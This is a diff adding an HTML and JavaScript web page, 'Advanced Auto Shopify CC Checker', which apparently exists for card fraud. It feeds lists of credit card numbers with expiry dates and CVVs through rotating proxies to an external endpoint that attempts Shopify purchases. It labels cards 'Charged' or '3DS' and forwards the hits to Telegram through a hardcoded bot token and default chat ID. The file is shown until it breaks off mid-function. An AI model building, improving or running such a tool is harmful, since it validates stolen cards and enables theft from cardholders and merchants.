@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Shopify CC Checker</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+
+        /* Global Styles */
+        :root {
+            --primary-color: #5d5dff;
+            --live-color: #22c55e;
+            --3ds-color: #2563eb;
+            --decline-color: #ef4444;
+            --errors-color: #f59e42;
+            --telegram-blue: #0088cc;
+            --progress-bg: #333;
+            --progress-fill: #5d5dff;
+        }
+
+        body.light {
+            --bg-color: #f0f0f0;
+            --container-bg: #ffffff;
+            --card-bg: #f8f8f8;
+            --text-color: #333333;
+            --secondary-text: #666666;
+            --border-color: #dddddd;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+            --progress-bg: #ddd;
+            --progress-fill: #5d5dff;
+        }
+
+        body.dark {
+            --bg-color: #121212;
+            --container-bg: #1e1e1e;
+            --card-bg: #222222;
+            --text-color: #e0e0e0;
+            --secondary-text: #bbbbbb;
+            --border-color: #333;
+            --shadow-color: rgba(0, 0, 0, 0.5);
+            --progress-bg: #333;
+            --progress-fill: #5d5dff;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            transition: background-color 0.3s ease, color 0.3s ease;
+            background-image: radial-gradient(circle, var(--secondary-text) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: bg-animate 20s linear infinite;
+        }
+
+        @keyframes bg-animate {
+            0% { background-position: 0 0; }
+            100% { background-position: 20px 20px; }
+        }
+
+        /* Theme Toggle */
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .theme-toggle:hover {
+            transform: scale(1.1);
+        }
+
+        /* Main Container */
+        .container {
+            background-color: var(--container-bg);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 24px var(--shadow-color);
+            width: 100%;
+            max-width: 900px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%);
+            animation: rotate-bg 15s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes rotate-bg {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Headings */
+        h2 {
+            text-align: center;
+            color: var(--primary-color);
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+        
+        h3 {
+            color: var(--secondary-text);
+            font-weight: 600;
+            margin-top: 0;
+        }
+
+        /* Input Boxes */
+        .input-group {
+            position: relative;
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .input-group:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 4px 15px var(--shadow-color);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(93, 93, 255, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(93, 93, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(93, 93, 255, 0); }
+        }
+
+        .input-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            box-sizing: border-box;
+            font-size: 16px;
+            min-height: 120px;
+            resize: vertical;
+            transition: all 0.3s ease;
+        }
+
+        .upload-btn, .verify-btn {
+            padding: 6px 10px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .upload-btn:hover, .verify-btn:hover {
+            background-color: #4a4aef;
+            transform: rotate(5deg);
+        }
+        
+        .upload-btn:active, .verify-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Settings Section */
+        .settings-group {
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 20px;
+        }
+
+        .settings-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--secondary-text);
+        }
+
+        .settings-group input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .telegram-row {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .telegram-row input {
+            flex: 1;
+        }
+
+        /* Control Buttons */
+        .control-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .start-btn, .pause-btn, .resume-btn, .clear-btn {
+            flex: 1;
+            padding: 15px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .pause-btn {
+            background-color: #ff9933;
+        }
+
+        .resume-btn {
+            background-color: #8aff8a;
+        }
+
+        .clear-btn {
+            background-color: #ff5d5d;
+        }
+
+        .start-btn:hover, .pause-btn:hover, .resume-btn:hover, .clear-btn:hover {
+            transform: scale(1.05);
+        }
+
+        .start-btn:active, .pause-btn:active, .resume-btn:active, .clear-btn:active {
+            transform: scale(0.99);
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            background-color: var(--progress-bg);
+            border-radius: 8px;
+            margin-bottom: 15px;
+            height: 10px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: var(--progress-fill);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Modern Stats Section */
+        #status-section {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        #status-section:hover {
+            transform: scale(1.02);
+        }
+
+        #status-message {
+            text-align: center;
+            margin-bottom: 15px;
+            color: var(--secondary-text);
+            font-size: 18px;
+            font-weight: bold;
+            min-height: 25px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .stat-card {
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            transition: all 0.6s;
+        }
+
+        .stat-card:hover::before {
+            animation: shine 0.6s ease-in-out;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .stat-card.live {
+            background: linear-gradient(135deg, var(--live-color), #16a34a);
+        }
+
+        .stat-card.three-ds {
+            background: linear-gradient(135deg, var(--3ds-color), #1d4ed8);
+        }
+
+        .stat-card.decline {
+            background: linear-gradient(135deg, var(--decline-color), #dc2626);
+        }
+
+        .stat-card.error {
+            background: linear-gradient(135deg, var(--errors-color), #ea580c);
+        }
+
+        .stat-label {
+            font-size: 14px;
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .stat-icon {
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+
+        /* Log Section */
+        #log-container {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 20px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid var(--border-color);
+        }
+
+        .log-entry {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: var(--bg-color);
+            border-radius: 8px;
+        }
+
+        /* Results and Cards */
+        #results-container {
+            margin-top: 20px;
+            border-top: 2px solid var(--border-color);
+            padding-top: 20px;
+        }
+
+        .result-card {
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 12px var(--shadow-color);
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.5s forwards;
+            color: white;
+            font-weight: 600;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .result-card:hover {
+            transform: translateY(-5px) rotate(1deg);
+            box-shadow: 0 8px 24px var(--shadow-color);
+        }
+
+        .result-card p {
+            margin: 5px 0;
+            line-height: 1.4;
+        }
+
+        .result-card strong {
+            font-weight: 700;
+        }
+        
+        /* Status Colors for Cards */
+        .result-card.hits { background: linear-gradient(135deg, var(--live-color), #16a34a); }
+        .result-card.three-ds { background: linear-gradient(135deg, var(--3ds-color), #1d4ed8); }
+        .result-card.decline { background: linear-gradient(135deg, var(--decline-color), #dc2626); }
+        .result-card.error { background: linear-gradient(135deg, var(--errors-color), #ea580c); }
+
+        .loader {
+            border: 4px solid var(--border-color);
+            border-radius: 50%;
+            border-top: 4px solid var(--primary-color);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Dev Info Section */
+        .dev-info {
+            background-color: var(--card-bg);
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 30px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+
+        .dev-info:hover {
+            transform: scale(1.02);
+        }
+        
+        .dev-info h3 {
+            margin-top: 0;
+            color: var(--primary-color);
+        }
+        
+        .contact-links {
+            display: flex;
+            gap: 25px;
+            margin-top: 10px;
+        }
+
+        .contact-link {
+            text-decoration: none;
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+            transition: all 0.2s ease;
+        }
+
+        .contact-link:hover {
+            transform: translateY(-5px) rotate(10deg);
+            color: var(--primary-color);
+        }
+        
+        .contact-icon {
+            font-size: 40px;
+            margin-bottom: 8px;
+            color: var(--telegram-blue);
+            transition: color 0.3s ease;
+        }
+
+        .about-text {
+            color: var(--secondary-text);
+            font-style: italic;
+            margin-top: 10px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .control-buttons {
+                flex-direction: column;
+            }
+            .input-group {
+                padding: 15px;
+            }
+            .input-header h3 {
+                font-size: 16px;
+            }
+            .upload-btn {
+                font-size: 10px;
+                padding: 4px 8px;
+            }
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body class="dark">
+    <div class="theme-toggle" onclick="toggleTheme()">
+        <i class="fas fa-moon"></i>
+    </div>
+    <div class="container">
+        <h2 class="title">Advanced Auto Shopify CC Checker</h2>
+        
+        <form id="mainForm">
+            <div class="input-group">
+                <div class="input-header">
+                    <h3>Enter Site URLs</h3>
+                    <input type="file" id="siteFileInput" name="siteFileInput" accept=".txt" hidden>
+                    <button type="button" class="upload-btn" onclick="document.getElementById('siteFileInput').click()">Upload</button>
+                </div>
+                <textarea id="siteList" placeholder="https://site1.com&#10;https://site2.com" required></textarea>
+            </div>
+            
+            <div class="input-group">
+                <div class="input-header">
+                    <h3>Enter Credit Cards</h3>
+                    <input type="file" id="ccFileInput" name="ccFileInput" accept=".txt" hidden>
+                    <button type="button" class="upload-btn" onclick="document.getElementById('ccFileInput').click()">Upload</button>
+                </div>
+                <textarea id="ccList" placeholder="5174220000218118|12|2029|107&#10;4111222233334444|05|27|123" required></textarea>
+            </div>
+
+            <div class="input-group">
+                <div class="input-header">
+                    <h3>Enter Proxies</h3>
+                    <input type="file" id="proxyFileInput" name="proxyFileInput" accept=".txt" hidden>
+                    <button type="button" class="upload-btn" onclick="document.getElementById('proxyFileInput').click()">Upload</button>
+                </div>
+                <textarea id="proxyList" placeholder="host:port:user:pass&#10;host2:port2:user2:pass2"></textarea>
+            </div>
+
+            <div class="settings-group">
+                <label>Telegram User ID: 
+                    <div class="telegram-row">
+                        <input type="text" id="telegramUserId" placeholder="Enter your Telegram User ID">
+                        <button type="button" class="verify-btn" onclick="verifyTelegram()">Verify</button>
+                    </div>
+                </label>
+                <label><input type="checkbox" id="autoSave"> Auto-save results to local storage</label>
+                <label><input type="checkbox" id="soundNotify"> Sound notification on live card</label>
+            </div>
+
+            <div class="control-buttons">
+                <button type="submit" class="start-btn">Start Processing</button>
+                <button type="button" class="pause-btn" id="pause-btn" disabled>Pause</button>
+                <button type="button" class="resume-btn" id="resume-btn" disabled>Resume</button>
+                <button type="button" class="clear-btn" id="clear-btn">Clear</button>
+            </div>
+        </form>
+
+        <div id="status-section">
+            <div class="loader" id="loader"></div>
+            <span id="status-message">Ready</span>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-card live" id="live-btn" onclick="downloadFile(liveCards, 'live')">
+                    <div class="stat-icon"><i class="fas fa-check-circle"></i></div>
+                    <div class="stat-label">Live</div>
+                    <div class="stat-number" id="live-count">0</div>
+                </div>
+                <div class="stat-card three-ds" id="3ds-btn" onclick="downloadFile(threeDS, '3ds')">
+                    <div class="stat-icon"><i class="fas fa-shield-alt"></i></div>
+                    <div class="stat-label">3DS</div>
+                    <div class="stat-number" id="3ds-count">0</div>
+                </div>
+                <div class="stat-card decline" id="decline-btn" onclick="downloadFile(declinedCards, 'decline')">
+                    <div class="stat-icon"><i class="fas fa-times-circle"></i></div>
+                    <div class="stat-label">Declined</div>
+                    <div class="stat-number" id="decline-count">0</div>
+                </div>
+                <div class="stat-card error" id="errors-btn" onclick="downloadFile(errorCards, 'errors')">
+                    <div class="stat-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                    <div class="stat-label">Errors</div>
+                    <div class="stat-number" id="errors-count">0</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="log-container"></div>
+        
+        <div id="results-container"></div>
+
+        <div class="dev-info">
+            <h3>Developer </h3>
+            <p><strong>Name:</strong> P R O D I G Y</p>
+            <p class="about-text">A just made for fun just trying something.must join my channel</p>
+            <div class="contact-links">
+                <a href="https://t.me/evilvx" class="contact-link" target="_blank">
+                    <i class="fab fa-telegram-plane contact-icon"></i>
+                    <span>Telegram</span>
+                </a>
+                <a href="https://t.me/+wC5EJ6avnfFjMTU1" class="contact-link" target="_blank">
+                    <i class="fab fa-telegram contact-icon"></i>
+                    <span>Channel</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <audio id="notify-sound" src="https://www.soundjay.com/buttons/beep-07.mp3" preload="auto"></audio>
+
+    <script>
+        // Theme Toggle and Persistence
+        function toggleTheme() {
+            document.body.classList.toggle('dark');
+            document.body.classList.toggle('light');
+            const icon = document.querySelector('.theme-toggle i');
+            if (document.body.classList.contains('dark')) {
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+                localStorage.setItem('theme', 'dark');
+            } else {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        // Load saved theme
+        const savedTheme = localStorage.getItem('theme') || 'dark';
+        document.body.classList.add(savedTheme);
+        if (savedTheme === 'light') {
+            document.querySelector('.theme-toggle i').classList.add('fa-sun');
+        } else {
+            document.querySelector('.theme-toggle i').classList.add('fa-moon');
+        }
+
+        // Data stores
+        let liveCards = [];
+        let threeDS = [];
+        let declinedCards = [];
+        let errorCards = [];
+        let cardsProcessedCount = 0;
+        let totalCards = 0;
+        let isPaused = false;
+        let requestQueue = [];
+        let activeRequests = 0;
+        let currentSiteIndex = 0;
+        let currentProxyIndex = 0;
+
+        // Telegram Bot Token - Your provided bot token
+        const BOT_TOKEN = '8272538793:AAGV-Tkw7uNC2AEq9Hx9tO4e4vusBf-_BHc';
+        let telegramUserId = '6637227162';
+
+        // Endpoint
+        const ENDPOINT_URL = 'https://legion-0jft.onrender.com/';
+
+        // Fixed rate limit at 1 second
+        const RATE_LIMIT_DELAY = 1000;
+
+        // Error keywords (system/technical errors only, not declined cards)
+        const ERROR_KEYWORDS = [
+            'Invalid URL', 'Error in 1 req', 'Product id is empty', 'Item is out of stock', 'Item out of stock',
+            'Token Empty', 'Clinte Token', 'Client Token', 'Id empty', 'py id empty', 'r2 id empty',
+            'cURL error', 'r3 token empty', 'del ammount empty', 'tax ammount empty',
+            'cn url empty', 'delivery ammount empty', 'r4 token empty', 'HCAPTCHA DETECTED',
+            'timeout', 'network error', 'connection failed', 'server error', 'bad request',
+            'unauthorized', 'forbidden', 'not found', 'method not allowed', 'internal server error',
+            'service unavailable', 'gateway timeout', 'processing_error', 'issuer_not_available',
+            'try_again_later', 'service_not_allowed', 'authentication_required', 'merchant_blacklist',
+            'invalid_account', 'currency_not_supported', 'duplicate_transaction', 'card_not_supported'
+        ];
+
+        // UI elements
+        const loader = document.getElementById('loader');
+        const statusMessage = document.getElementById('status-message');
+        const progressBar = document.getElementById('progress-bar');
+        const resultsContainer = document.getElementById('results-container');
+        const logContainer = document.getElementById('log-container');
+        const liveCount = document.getElementById('live-count');
+        const threeDSCount = document.getElementById('3ds-count');
+        const declineCount = document.getElementById('decline-count');
+        const errorsCount = document.getElementById('errors-count');
+        const siteList = document.getElementById('siteList');
+        const ccList = document.getElementById('ccList');
+        const proxyList = document.getElementById('proxyList');
+        const siteFileInput = document.getElementById('siteFileInput');
+        const ccFileInput = document.getElementById('ccFileInput');
+        const proxyFileInput = document.getElementById('proxyFileInput');
+        const mainForm = document.getElementById('mainForm');
+        const pauseBtn = document.getElementById('pause-btn');
+        const resumeBtn = document.getElementById('resume-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const autoSaveCheckbox = document.getElementById('autoSave');
+        const soundNotifyCheckbox = document.getElementById('soundNotify');
+        const telegramUserIdInput = document.getElementById('telegramUserId');
+        const notifySound = document.getElementById('notify-sound');
+
+        // Telegram Functions
+        telegramUserIdInput.addEventListener('input', (e) => {
+            telegramUserId = e.target.value.trim();
+        });
+
+        async function sendTelegramMessage(text) {
+            if (!telegramUserId) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: telegramUserId, 
+                        text: text, 
+                        parse_mode: 'HTML' 
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram send error:', e);
+            }
+        }
+
+        async function verifyTelegram() {
+            const userId = telegramUserIdInput.value.trim();
+            if (!userId) {
+                alert('Please enter your Telegram User ID first.');
+                return;
+            }
+            telegramUserId = userId;
+            await sendTelegramMessage('<b>â Verification Successful!</b>\n\nYour Telegram is now connected to the CC Checker. You will receive notifications when hits or 3DS cards are found.');
+            alert('Verification message sent! Check your Telegram.');
+        }
+
+        // Event Listeners
+        mainForm.addEventListener('submit', handleCombinedSubmit);
+        pauseBtn.addEventListener('click', pauseProcessing);
+        resumeBtn.addEventListener('click', resumeProcessing);
+        clearBtn.addEventListener('click', clearAll);
+        
+        siteFileInput.addEventListener('change', (e) => handleFileUpload(e, siteList));
+        ccFileInput.addEventListener('change', (e) => handleFileUpload(e, ccList));
+        proxyFileInput.addEventListener('change', (e) => handleFileUpload(e, proxyList));
+
+        async function handleFileUpload(event, textarea) {
+            const file = event.target.files[0];
+            if (file) {
+                const lines = await readFile(file);
+                textarea.value = lines.join('\n');
+            }
+        }
+
+        async function readFile(file) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const lines = e.target.result.split('\n').filter(line => line.trim() !== '');
+                    resolve(lines);
+                };
+                reader.readAsText(file);
+            });
+        }
+
+        // Validate CC format (basic Luhn check)
+        function isValidCC(cc) {
+            const ccParts = cc.split('|');
+            if (ccParts.length !== 4) return false;
+            const cardNumber = ccParts[0].replace(/\D/g, '');
+            let sum = 0;
+            let isEven = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i), 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
+
+        // Handle form submission
+        async function handleCombinedSubmit(event) {
+            event.preventDefault();
+            
+            const siteLines = siteList.value.split('\n').filter(line => line.trim() !== '');
+            const ccLines = ccList.value.split('\n').filter(line => line.trim() !== '');
+            const proxyLines = proxyList.value.split('\n').filter(line => line.trim() !== '');
+
+            if (siteLines.length === 0 || ccLines.length === 0) {
+                alert("Please enter or upload at least one site and one credit card.");
+                return;
+            }
+
+            // Validate CCs
+            const invalidCCs = ccLines.filter(cc => !isValidCC(cc));
+            if (invalidCCs.length > 0) {
+                alert(`Invalid CC formats detected: ${invalidCCs.join(', ')}`);
+                return;
+            }
+
+            resetState();
+            totalCards = ccLines.length;
+            startLoading(`Checking...`);
+
+            requestQueue = ccLines.map((cc, index) => ({
+                cc,
+                siteLines,
+                proxyLines,
+                index
+            }));
+            
+            pauseBtn.disabled = false;
+            resumeBtn.disabled = true;
+
+            processNext();
+        }
+
+        // Processing logic with concurrency, pause/resume, proxy rotation
+        async function processNext() {
+            if (isPaused || requestQueue.length === 0) {
+                if (activeRequests === 0 && requestQueue.length === 0) {
+                    stopLoading('Processing Complete.');
+                    if (autoSaveCheckbox.checked) saveResultsToLocalStorage();
+                }
+                return;
+            }
+
+            if (activeRequests >= 5) return; // Max concurrent
+
+            const request = requestQueue.shift();
+            activeRequests++;
+
+            statusMessage.textContent = `Checking... (card ${request.index + 1} of ${totalCards})`;
+            updateProgress();
+
+            // Rotate proxy
+            const proxyToUse = request.proxyLines[currentProxyIndex % request.proxyLines.length] || '';
+            currentProxyIndex++;
+
+            const result = await processCardOnSites(request.cc, request.siteLines, proxyToUse, currentSiteIndex);
+
+            if (result) {
+                currentSiteIndex = result.siteIndex;
+                addResultToDOM(result.resultData, result.cardClass);
+                addToDownloadList(result.resultData, result.cardClass);
+                addLog(`Processed ${request.cc} on ${result.resultData.site} - Status: ${result.resultData.status}`);
+                if (result.cardClass === 'hits' && soundNotifyCheckbox.checked) {
+                    notifySound.play();
+                }
+
+                // Send Telegram notification for hits and 3DS
+                if ((result.cardClass === 'hits' || result.cardClass === 'three-ds') && telegramUserId) {
+                    const emoji = result.cardClass === 'hits' ? 'â' : 'ðµ';
+                    const statusText = result.cardClass === 'hits' ? 'Charged' : '3DS';
+                    const message = `<b>${statusText} ${emoji}</b>\n<b>Card:</b> <code>${result.resultData.card}</code>\n<b>Response:</b> ${result.resultData.status}\n<b>Gate:</b> Shopify\n<b>Site:</b> ${result.resultData.site}\n<b>Time:</b> ${result.resultData.time}`;
+                    await sendTelegramMessage(message);
+                }
+            } else {
+                const resultData = { card: request.cc, site: 'All sites', status: "All sites failed for this card.", gate: "N/A", time: "N/A" };
+                const cardClass = 'error';
+                addResultToDOM(resultData, cardClass);
+                addToDownloadList(resultData, cardClass);
+                addLog(`All sites failed for ${request.cc}`);
+            }
+
+            cardsProcessedCount++;
+            activeRequests--;
+            setTimeout(processNext, RATE_LIMIT_DELAY); // Fixed 1 second delay
+            processNext(); // Fill concurrency
+        }
+
+        async function processCardOnSites(cc, siteLines, proxyToUse, startSiteIndex) {
+            let numSites = siteLines.length;
+            let siteIndex = startSiteIndex;
+
+            for (let i = 0; i < numSites; i++) {
+                const site = siteLines[siteIndex % numSites];
+                const endpointUrl = `${ENDPOINT_URL}?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxyToUse)}`;
+                
+                const startTime = performance.now();
+
+                try {
+                    const response = await fetch(endpointUrl);
+                    const responseText = await response.text();
+                    const endTime = performance.now();
+                    const timeTaken = ((endTime - startTime) / 1000).toFixed(2);
+                    
+                    let responseData;
+                    try {
+                        responseData = JSON.parse(responseText);
+                    } catch (e) {
+                        responseData = null;
+                    }
+
+                    let cardStatus, cardClass;
+                    let gate = "Shopify";
+                    let amount = null;
+                    
+                    if (responseData && responseData.Response) {
+                        const apiResponse = responseData.Response;
+                        amount = responseData.Price;
+                        
+                        const lowerCaseResponse = apiResponse.toLowerCase();
+                        
+                        // Check for system/technical errors first
+                        const isSystemError = ERROR_KEYWORDS.some(keyword => lowerCaseResponse.includes(keyword.toLowerCase()));
+
+                        if (isSystemError) {
+                             cardStatus = `Error: ${apiResponse}`;
+                             cardClass = 'error';
+                             statusMessage.textContent = `Error on site ${site}. Switching to next site for this card...`;
+                             addLog(`Error on ${site} for ${cc}: ${apiResponse}`);
+                             siteIndex++;
+                             continue;
+                        } else if (lowerCaseResponse.includes("thank you")) {
+                            // Parse amount from "Thank You 15.0" format
+                            const thankYouMatch = apiResponse.match(/thank you\s*([\d.]+)/i);
+                            const extractedAmount = thankYouMatch ? thankYouMatch[1] : amount;
+                            cardStatus = `Thank you for your order${extractedAmount ? ` ($${extractedAmount})` : ''}`;
+                            cardClass = 'hits';
+                        } else if (lowerCaseResponse.includes("3ds") || lowerCaseResponse.includes("3d_authentication")) {
+                            cardStatus = "3DS Required";
+                            cardClass = 'three-ds';
+                        } else {
+                            // Everything else is a decline (including CARD_DECLINED)
+                            cardStatus = `API Response: ${apiResponse}`;
+                            cardClass = 'decline';
+                        }
+                    } else {
+                        // Check if raw response contains "Thank You"
+                        const lowerResponse = responseText.toLowerCase();
+                        if (lowerResponse.includes("thank you")) {
+                            const thankYouMatch = responseText.match(/thank you\s*([\d.]+)/i);
+                            const extractedAmount = thankYouMatch ? thankYouMatch[1] : null;
+                            cardStatus = `Thank you for your order${extractedAmount ? ` ($${extractedAmount})` : ''}`;
+                            cardClass = 'hits';
+                        } else {
+                            cardStatus = `Raw Response: ${responseText}`;
+                            cardClass = 'decline';
+                        }
+                    }
+                    
+                    const resultData = {
+                        card: cc,
+                        site,
+                        status: cardStatus,
+                        gate,
+                        time: `${timeTaken}s`,
+                        amount
+                    };
+
+                    return {
+                        resultData,
+                        cardClass,
+                        siteIndex: siteIndex + 1
+                    };
+
+                } catch (error) {
+                    console.error('Fetch error:', error);
+                    statusMessage.textContent = `Network error on site ${site}. Switching to next site for this card...`;
+                    addLog(`Network error on ${site} for ${cc}: ${error.message}`);
+                    siteIndex++;
+                    continue; 
+                }
+            }
+
+            return null;
+        }
+
+        function pauseProcessing() {
+            isPaused = true;
+            pauseBtn.disabled = true;
+            resumeBtn.disabled = false;
+            statusMessage.textContent = 'Processing Paused.';
+            addLog('Processing paused.');
+        }
+
+        function resumeProcessing() {
+            isPaused = false;
+            pauseBtn.disabled = false;
+            resumeBtn.disabled = true;
+            statusMessage.textContent = `Resuming processing...`;
+            addLog('Processing resumed.');
+            processNext();
+        }
+
+        function clearAll() {
+            resetState();
+            logContainer.innerHTML = '';
+            addLog('Cleared all data.');
+        }
+
+        function updateProgress() {
+            const progress = (cardsProcessedCount / totalCards) * 100;
+            progressBar.style.width = `${progress}%`;
+        }
+
+        // Add result to DOM with new format
+        function addResultToDOM(data, cardClass) {
+            let displayStatus = '';
+            if (cardClass === 'hits') {
+                displayStatus = 'Charged â';
+            } else if (cardClass === 'decline') {
+                displayStatus = 'Declined â';
+            } else if (cardClass === 'three-ds') {
+                displayStatus = '3DS ðµ';
+            } else {
+                displayStatus = 'Error â ï¸';
+            }
+
+            const resultCard = document.createElement('div');
+            resultCard.className = `result-card ${cardClass}`;
+            resultCard.innerHTML = `
+                <p><strong>${displayStatus}</strong></p>
+                <p><strong>Card:</strong> ${data.card}</p>
+                <p><strong>Response:</strong> ${data.status}</p>
+                <p><strong>Gate:</strong> ${data.gate}</p>
+                <p><strong>Time:</strong> ${data.time}</p>
+            `;
+            resultsContainer.prepend(resultCard);
+        }
+
+        // Add to download list (FIXED: Only count in correct category)
+        function addToDownloadList(data, cardClass) {
+            const cardString = `${data.card} | ${data.site} | ${data.status}`;
+            
+            // Clear classification - only add to one category
+            if (cardClass === 'hits') {
+                liveCards.push(cardString);
+                liveCount.textContent = liveCards.length;
+            } else if (cardClass === 'three-ds') {
+                threeDS.push(cardString);
+                threeDSCount.textContent = threeDS.length;
+            } else if (cardClass === 'decline') {
+                declinedCards.push(cardString);
+                declineCount.textContent = declinedCards.length;
+            } else if (cardClass === 'error') {
+                errorCards.push(cardString);
+                errorsCount.textContent = errorCards.length;
+            }
+        }
+
+        // Add log entry
+        function addLog(message) {
+            const logEntry = document.createElement('div');
